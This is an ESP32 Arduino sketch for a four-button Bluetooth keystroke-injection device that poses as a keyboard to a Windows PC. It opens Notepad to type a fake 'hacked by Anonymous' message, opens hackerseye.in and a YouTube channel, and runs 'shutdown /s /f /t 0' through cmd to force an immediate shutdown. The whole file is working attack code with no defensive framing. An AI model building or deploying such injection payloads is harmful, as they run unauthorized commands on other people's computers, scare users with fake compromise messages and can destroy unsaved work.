//ESP32 BLE HID
#include <BleKeyboard.h>

#define BUTTON_1_PIN 16   // Trigger 1: Notepad message
#define BUTTON_2_PIN 17   // Trigger 2: Open hackerseye.in
#define BUTTON_3_PIN 18   // Trigger 3: Open YouTube channel
#define BUTTON_4_PIN 19   // Trigger 4: Shutdown computer
char kbd[] = "BLE-HID";      // Device Name
BleKeyboard bleKeyboard(kbd, "Espressif", 100);

bool lastState1 = HIGH;
bool lastState2 = HIGH;
bool lastState3 = HIGH;
bool lastState4 = HIGH;

void setup() {
  Serial.begin(115200);

  pinMode(BUTTON_1_PIN, INPUT_PULLUP);
  pinMode(BUTTON_2_PIN, INPUT_PULLUP);
  pinMode(BUTTON_3_PIN, INPUT_PULLUP);
  pinMode(BUTTON_4_PIN, INPUT_PULLUP);

  bleKeyboard.begin();
}

void loop() {
  if (bleKeyboard.isConnected()) {
    bool state1 = digitalRead(BUTTON_1_PIN);
    bool state2 = digitalRead(BUTTON_2_PIN);
    bool state3 = digitalRead(BUTTON_3_PIN);
    bool state4 = digitalRead(BUTTON_4_PIN);

    // TRIGGER 1: Open notepad and type message
    if (lastState1 == HIGH && state1 == LOW) {
      Serial.println("Trigger 1 activated: Notepad message");
      
      // Open Run dialog
      bleKeyboard.press(KEY_LEFT_GUI);
      bleKeyboard.press('r');
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
      
      // Open Notepad
      bleKeyboard.print("notepad");
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(2000);
      
      // Type the message
      const char* txt = "YOUR SYSTEM HAS BEEN HACKED BY ANONYMOUS";
      for (int i = 0; i < strlen(txt); i++) {
        bleKeyboard.print(txt[i]);
        delay(50);
      }
    }

    // TRIGGER 2: Open hackerseye.in in browser
    if (lastState2 == HIGH && state2 == LOW) {
      Serial.println("Trigger 2 activated: Opening hackerseye.in");
      
      // Open Run dialog
      bleKeyboard.press(KEY_LEFT_GUI);
      bleKeyboard.press('r');
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
      
      // Type website URL
      const char* url = "https://hackerseye.in";
      for (int i = 0; i < strlen(url); i++) {
        bleKeyboard.print(url[i]);
        delay(30);
      }
      
      // Open in browser
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // TRIGGER 3: Open YouTube channel
    if (lastState3 == HIGH && state3 == LOW) {
      Serial.println("Trigger 3 activated: Opening YouTube channel");
      
      // Open Run dialog
      bleKeyboard.press(KEY_LEFT_GUI);
      bleKeyboard.press('r');
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
      
      // Type YouTube URL
      const char* ytUrl = "https://youtube.com/@hecc21";
      for (int i = 0; i < strlen(ytUrl); i++) {
        bleKeyboard.print(ytUrl[i]);
        delay(30);
      }
      
      // Open in browser
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // TRIGGER 4: Shutdown computer via CMD
    if (lastState4 == HIGH && state4 == LOW) {
      Serial.println("Trigger 4 activated: Shutting down computer");
      
      // Open Run dialog
      bleKeyboard.press(KEY_LEFT_GUI);
      bleKeyboard.press('r');
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
      
      // Open Command Prompt
      bleKeyboard.print("cmd");
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(2000);
      
      // Type shutdown command
      const char* shutdownCmd = "shutdown /s /f /t 0";
      for (int i = 0; i < strlen(shutdownCmd); i++) {
        bleKeyboard.print(shutdownCmd[i]);
        delay(30);
      }
      
      // Execute shutdown command
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
    }

    lastState1 = state1;
    lastState2 = state2;
    lastState3 = state3;
    lastState4 = state4;
  }

  delay(10); // Small debounce
}
